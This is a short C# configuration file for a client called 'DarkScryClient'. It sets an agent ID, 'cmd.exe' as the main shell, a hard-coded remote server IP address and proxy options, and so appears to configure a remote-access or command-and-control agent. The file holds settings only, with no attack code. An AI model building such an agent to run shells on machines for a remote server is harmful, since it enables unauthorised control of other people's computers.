

namespace DarkScryClient
{
	enum ProxyKindOptions
	{
		WebSocketBrowser = 0,
	}
	internal class Config
	{
		public static string agent_id = "95a0f517-714f-4995-8a08-f54a531e75e4";
		public static string MainShell = "cmd.exe";
		public static bool IsMainShellRuning = false;
                public static string ServerIp = "172.236.98.55";
                public static readonly string AgentName = "DarkScry Cleint";
                public static readonly string AgnetVersion = "1.0.0";

		public static readonly bool UseProxy = false;
		public static string ProxyHost = "localhost";
		public static readonly ProxyKindOptions ProxyKind = ProxyKindOptions.WebSocketBrowser;
	}
}
